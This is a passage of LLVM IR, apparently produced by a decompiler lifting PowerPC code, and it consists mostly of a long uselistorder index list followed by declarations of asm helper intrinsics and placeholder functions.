576, 577, 672, 673, 304, 674, 305, 675, 680, 681, 682, 683, 207, 684, 685, 129, 686, 306, 687, 688, 689, 676, 130, 677, 678, 131, 679, 653, 307, 308, 654, 892, 690, 691, 692, 693, 163, 694, 695, 696, 309, 697, 698, 699, 700, 701, 702, 703, 704, 705, 208, 706, 707, 310, 708, 709, 311, 710, 312, 711, 712, 18, 713, 714, 313, 314, 718, 315, 719, 316, 19, 715, 20, 716, 717, 209, 317, 725, 722, 133, 721, 132, 185, 723, 318, 724, 184, 726, 727, 728, 729, 41, 750, 751, 752, 21, 753, 754, 755, 756, 186, 757, 758, 759, 760, 761, 51, 55, 54, 762, 134, 763, 50, 321, 764, 319, 320, 210, 765, 75, 893, 894, 74, 895, 135, 896, 76, 897, 136, 767, 768, 769, 770, 771, 137, 772, 322, 773, 774, 57, 775, 56, 776, 777, 778, 779, 780, 781, 782, 323, 783, 784, 211, 785, 786, 324, 787, 61, 62, 788, 138, 789, 790, 791, 325, 212, 213, 214, 215, 326, 792, 793, 794, 139, 795, 327, 796, 797, 798, 799, 800, 218, 801, 216, 802, 217, 803, 140, 804, 805, 806, 807, 808, 141, 809, 328, 810, 811, 812, 813, 814, 815, 816, 329, 817, 818, 819, 820, 219, 821, 220, 221, 222, 330, 822, 142, 824, 143, 825, 77, 826, 827, 828, 829, 331, 830, 223, 831, 832, 144, 833, 332, 834, 835, 836, 837, 838, 839, 840, 224, 841, 225, 226, 227, 228, 229, 230, 231, 145, 842, 843, 844, 845, 146, 846, 333, 847, 848, 849, 850, 851, 852, 853, 334, 854, 855, 232, 856, 233, 234, 235, 236, 237, 238, 239, 240, 335, 857, 860, 861, 862, 863, 865, 866, 42, 336, 867, 868, 337, 869, 870, 871, 338, 864, 872, 873, 241, 874, 242, 243, 244, 245, 246, 247, 147, 875, 876, 877, 878, 148, 879, 339, 880, 881, 882, 883, 884, 885, 886, 887, 248, 888, 249, 250, 251, 149, 889, 898, 899, 900, 150, 901, 340, 902, 903, 904, 905, 906, 907, 908, 909, 252, 910, 253, 254, 255, 151, 911, 152, 959, 344, 963, 964, 965, 961, 962, 960, 966, 967, 968, 969, 970, 971, 972, 153, 973, 345, 974, 975, 976, 977, 978, 979, 342, 980, 981, 187, 982, 983, 984, 985, 986, 987, 988, 989, 990, 349, 991, 992, 993, 994, 995, 43, 996, 997, 998, 343, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 346, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 347, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 348, 1053, 1054, 1055, 155, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 164, 1070, 1073, 1074, 1071, 1072, 1075, 1076, 1077, 1078, 256, 1079, 1080, 1081, 257, 1082, 1083, 350, 154, 1084, 1085, 1086, 1087, 1088, 351, 1089, 1090, 352, 1091, 353, 1092, 341, 1093, 156, 1094, 1095, 1096, 44, 1097, 1098, 1099, 1100, 258, 1101, 259, 260, 1123, 1124, 45, 1125, 1126, 63, 1127, 1128, 1129, 354, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1144, 1145, 1146, 1152, 1153, 1154, 1155, 1156, 1501, 1502, 1503, 1157, 584, 585, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530 }
  uselistorder i32* @lr, { 3, 26, 772, 773, 774, 778, 30, 782, 783, 784, 27, 28, 29, 785, 786, 787, 788, 799, 800, 801, 802, 803, 804, 789, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 835, 836, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 864, 865, 866, 867, 898, 899, 31, 32, 347, 348, 33, 34, 868, 869, 600, 601, 602, 870, 852, 871, 36, 35, 37, 349, 350, 351, 908, 909, 910, 911, 920, 923, 924, 926, 921, 922, 919, 917, 779, 780, 781, 775, 776, 777, 914, 915, 916, 832, 833, 834, 603, 604, 44, 45, 46, 900, 901, 902, 903, 904, 905, 906, 907, 912, 913, 38, 39, 40, 872, 873, 877, 878, 879, 880, 881, 874, 875, 876, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 837, 838, 839, 840, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 895, 896, 897, 894, 47, 605, 606, 573, 574, 575, 607, 608, 609, 525, 526, 527, 610, 611, 612, 320, 613, 48, 614, 615, 616, 465, 49, 50, 51, 790, 791, 792, 793, 794, 797, 798, 925, 352, 353, 354, 41, 42, 43, 359, 360, 355, 356, 357, 358, 361, 362, 363, 52, 617, 618, 619, 364, 53, 408, 918, 795, 796, 54, 55, 56, 766, 620, 735, 621, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 622, 623, 177, 4, 5, 6, 7, 8, 178, 179, 9, 10, 11, 12, 13, 14, 15, 16, 180, 181, 182, 17, 18, 19, 20, 21, 22, 23, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 224, 225, 226, 227, 228, 229, 230, 231, 183, 184, 185, 186, 187, 242, 576, 577, 578, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 24, 25, 321, 322, 323, 324, 325, 339, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 1, 340, 341, 342, 343, 344, 345, 346, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 2, 395, 396, 397, 398, 399, 0, 400, 401, 402, 403, 404, 405, 406, 407, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 466, 467, 468, 470, 471, 472, 469, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 624, 625, 628, 629, 630, 631, 626, 627, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 767, 768, 769, 770, 771 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare i32 @unknown_10000000() local_unnamed_addr

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i64 @__decompiler_undefined_function_3() local_unnamed_addr
